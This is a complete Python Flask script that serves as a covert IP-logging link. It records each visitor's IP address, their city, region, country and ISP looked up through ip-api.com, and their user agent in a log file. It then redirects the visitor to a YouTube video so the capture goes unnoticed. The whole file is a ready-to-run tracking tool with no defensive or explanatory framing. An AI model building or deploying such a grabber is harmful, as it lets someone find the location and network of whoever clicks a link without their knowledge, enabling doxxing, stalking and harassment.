from flask import Flask, request, redirect
import requests
import datetime

app = Flask(__name__)

# Get IP info using ip-api
def get_ip_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        return response.json()
    except:
        return {"status": "fail"}

@app.route('/')
def log_and_redirect():
    # Get IP address
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    # Get geolocation info
    geo = get_ip_info(ip)

    # Get User-Agent
    ua = request.headers.get('User-Agent')

    # Log it
    with open("logs.txt", "a") as log:
        log.write(f"{datetime.datetime.now()} | IP: {ip} | Location: {geo.get('city')}, {geo.get('regionName')}, {geo.get('country')} | ISP: {geo.get('isp')} | UA: {ua}\n")

    # redirect to youtube video (example:)
    return redirect("https://youtu.be/xvFZjo5PgG0?si=Iai3ep-YvVG4xWom")

if __name__ == "__main__":
    app.run(port=5000)
